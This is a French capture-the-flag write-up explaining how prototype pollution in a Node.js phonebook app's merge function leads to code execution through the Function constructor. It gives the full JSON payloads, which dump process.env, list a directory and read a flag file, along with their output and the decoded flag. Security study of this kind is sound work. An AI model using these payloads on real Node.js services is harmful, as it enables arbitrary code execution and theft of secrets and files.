# Intro
En cherchant en ligne, je suis tombé sur la pollution de prototype. Puis la fonction merge est ici la méthode qui cause un problème. Elle copie ce qu'il y a dans b sur a.
Si b redéfini Object.prototype ca aura un impact sur tous les objets en js.

# Étape 1
Add le contact (1) :
{"name":"__proto__", "options":{"lang":"constructor", "spellcheck":"constructor", "__proto__":{"data":""}}, "data":{"name":{"toString": "console.log(process.env)"}}}

## Explication
Contacts est un array, Contacts[info.name] = Contacts['__proto__'] = Array prototype

Donc Array prototype aura ceci:
{
    "options":{
        "type" : "JSON",
        "date" : creationTime,
        "lang" : "en",
        "spellcheck" : "simple"
    },
    "data": {
        "name":"__proto__", 
        "options":{
            "lang":"constructor", 
            "spellcheck":"constructor", 
            "__proto__":{
                "data":""
            }
        }, 
        "data":{
            "name":{
                "toString": "console.log(process.env)"
            }
        }
    }
}

# Étape 2
spellcheck (3):
On entre dans le stdin le mot data

## Explication
Contacts['data'] va monter au parent comme il n'est pas présent dans le array Contact, donc ça monte au prototype de Array
Lors du spellcheck, la méthode merge est appelé, entre un objet defaultOptions fixe puis mon options pollué :
"options":{
    "lang":"constructor", 
    "spellcheck":"constructor", 
    "__proto__":{
        "data":""
    }
}

Ça va écraser les valeur du defaultOptions.

Ainsi dans la méthode spellchecking se faisant après le merge, on aura que checker = Function()
*Le constructor d'un constructor d'un objet est = Function

Function peut prendre en paramètre son corps (son body)

Dans mon cas le body est 
"data":{
    "name":{
        "toString": "console.log(process.env)" // <-- ICI (*Il s'agit d'un string mais après le spellchecking ça devient une fonction)
    }
}

Ca donne que toString = Function("console.log(process.env)")
Ici c'est le toString de mon objet et non pas du prototype Object.


# Étape 3
lister les contacts
Quand on liste les contacts, on concatène une string et un objet. Implicitement, un appel sur toString est effectué. Si cet objet est le mien, le toString sera donc la fonction que j'ai redéfini.

Voilà le résultat
{ SHELL: '/bin/false',
  PWD: '/opt/phonebook',
  LOGNAME: 'phonebook',
  HOME: '/home/phonebook',
  LANG: 'C.UTF-8',
  INVOCATION_ID: '444c8fda91c245a089079f444abf7ef5',
  USER: 'phonebook',
  SHLVL: '1',
  JOURNAL_STREAM: '9:148566',
  PATH:
   '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin',
  OLDPWD: '/',
  _: '/usr/bin/socat',
  SOCAT_PID: '10099',
  SOCAT_PPID: '220',
  SOCAT_VERSION: '1.7.3.3',
  SOCAT_SOCKADDR: '10.66.241.22',
  SOCAT_SOCKPORT: '6666',
  SOCAT_PEERADDR: '74.58.240.200',
  SOCAT_PEERPORT: '36569' }


Je remarque un PWD dans le répertoire '/opt/phonebook'

Si je recommence donc toutes les étapes ci haut mais avec ce payload cette fois:
{"name":"__proto__", "options":{"lang":"constructor", "spellcheck":"constructor", "__proto__":{"data":""}}, "data":{"name":{"toString": "console.log(process.mainModule.require('fs').readdirSync('/opt/phonebook'))"}}}

on voit ceci
[ 'flag', 'index.js', 'run.sh' ]


# Payload final
{"name":"__proto__", "options":{"lang":"constructor", "spellcheck":"constructor", "__proto__":{"data":""}}, "data":{"name":{"toString": "console.log(process.mainModule.require('fs').readFileSync('/opt/phonebook/flag'))"}}}

ca me montre ca :
<Buffer 46 4c 41 47 2d 32 65 61 37 61 32 35 32 63 63 31 31 38 66 65 31 62 64 30 66 33 34 62 37 35 64 38 35 62 37 34 36 0a>
ce qui donne :
FLAG-2ea7a252cc118fe1bd0f34b75d85b746